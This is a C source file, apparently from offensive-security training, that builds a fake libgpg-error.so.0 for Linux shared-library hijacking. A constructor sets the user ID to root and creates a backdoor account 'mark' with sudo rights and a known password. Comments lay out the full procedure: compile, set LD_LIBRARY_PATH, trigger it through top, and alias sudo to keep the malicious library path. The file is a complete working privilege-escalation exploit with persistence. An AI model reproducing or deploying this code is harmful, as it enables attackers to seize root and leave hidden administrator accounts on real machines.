#include <stdio.h>
#include <stdlib.h>
#include <unistd.h> // for setuid/setgid

static void runmahpayload() __attribute__((constructor));
int gpgrt_onclose;
int _gpgrt_putc_overflow;
int gpgrt_feof_unlocked;
int gpgrt_vbsprintf;
int gpgrt_ungetc;
int gpg_err_init;
int gpgrt_tmpfile;
int gpgrt_fputs_unlocked;
int gpgrt_ftello;
int gpgrt_flockfile;
int gpgrt_get_syscall_clamp;
int gpg_err_code_from_errno;
int gpgrt_clearerr;
int gpg_error_check_version;
int gpgrt_vfprintf;
int gpgrt_opaque_set;
int gpgrt_vasprintf;
int gpgrt_fprintf_unlocked;
int gpgrt_lock_init;
int gpgrt_ftell;
int gpgrt_fseeko;
int gpgrt_syshd;
int gpgrt_check_version;
int gpgrt_setvbuf;
int gpgrt_ftrylockfile;
int gpgrt_lock_destroy;
int gpgrt_fname_set;
int gpgrt_bsprintf;
int _gpgrt_set_std_fd;
int _gpgrt_pending_unlocked;
int gpgrt_fclose_snatch;
int gpgrt_fwrite;
int gpgrt_fseek;
int _gpgrt_get_std_stream;
int gpg_err_code_from_syserror;
int gpgrt_asprintf;
int gpg_err_code_to_errno;
int gpgrt_free;
int gpgrt_syshd_unlocked;
int gpgrt_set_nonblock;
int gpgrt_fread;
int gpgrt_fdopen_nc;
int gpgrt_opaque_get;
int gpgrt_fopenmem;
int gpgrt_lock_unlock;
int gpg_err_deinit;
int gpgrt_b64dec_start;
int gpgrt_b64dec_finish;
int gpgrt_fname_get;
int gpgrt_fpopen;
int gpgrt_fputc;
int gpgrt_snprintf;
int gpgrt_lock_trylock;
int gpgrt_fgetc;
int gpg_strerror;
int gpgrt_fopencookie;
int gpgrt_fileno_unlocked;
int gpgrt_vfprintf_unlocked;
int gpgrt_yield;
int gpgrt_write;
int gpgrt_printf_unlocked;
int gpgrt_fclose;
int gpgrt_fdopen;
int gpgrt_fpopen_nc;
int _gpgrt_getc_underflow;
int gpgrt_set_syscall_clamp;
int gpgrt_fputs;
int gpgrt_vsnprintf;
int gpgrt_fgets;
int gpgrt_write_sanitized;
int gpgrt_fileno;
int gpgrt_set_binary;
int gpgrt_lock_lock;
int gpgrt_write_hexstring;
int gpgrt_getline;
int gpgrt_fopenmem_init;
int gpgrt_printf;
int gpgrt_freopen;
int gpg_strsource;
int gpg_err_set_errno;
int gpgrt_sysopen_nc;
int gpgrt_rewind;
int gpgrt_setbuf;
int gpgrt_ferror_unlocked;
int gpgrt_mopen;
int gpgrt_read_line;
int gpgrt_feof;
int gpgrt_sysopen;
int gpgrt_set_alloc_func;
int gpgrt_funlockfile;
int gpgrt_read;
int gpgrt_fopen;
int _gpgrt_pending;
int gpgrt_clearerr_unlocked;
int gpgrt_get_nonblock;
int gpg_strerror_r;
int gpgrt_b64dec_proc;
int gpgrt_ferror;
int gpgrt_fprintf;
int gpgrt_fflush;
int gpgrt_poll;

// Rename this file to hax.c
// Place gpg.map and hax.c in the same folder
// Run gcc -shared -Wl,--version-script gpg.map -o libgpg-error.so.0 -fPIC hax.c
// Run export LD_LIBRARY_PATH=/home/offsec/ldlib/
// Run top

// Bypass sudo restriction
// Run alias sudo=\"sudo LD_LIBRARY_PATH=/home/offsec/ldlib\" >> ~/.bashrc
// Run source ~/.bashrc
// Run top
void runmahpayload() {
    setuid(0);
    setgid(0);
    printf("DLL HIJACKING IN PROGRESS \n");

    if (geteuid() == 0) {
        printf("Root! \n");
        system("useradd mark -s /bin/bash");
        system("usermod -aG sudo mark");
        system("usermod --password $(echo mark1234 | openssl passwd -1 -stdin) mark");
    }
}
